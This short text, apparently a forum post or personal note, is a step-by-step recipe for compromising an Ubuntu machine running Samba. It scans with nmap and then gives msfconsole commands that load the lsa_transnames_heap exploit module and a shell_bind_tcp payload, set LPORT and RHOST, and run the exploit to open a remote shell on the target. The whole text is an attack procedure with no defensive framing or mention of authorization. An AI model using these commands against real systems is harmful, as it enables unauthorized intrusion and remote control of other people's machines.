Using msfconsole & nmap, an Ubuntu machine can be exploited doing the following:

Use nmap with any flags of your choice, if a machine runs Ubuntu and has Samba running, do the following in msfconsole:

msf > use linux/samba/lsa_transnames_heap
msf > set payload linux/x86/shell_bind_tcp

Set LPORT and RHOST, then run "exploit".
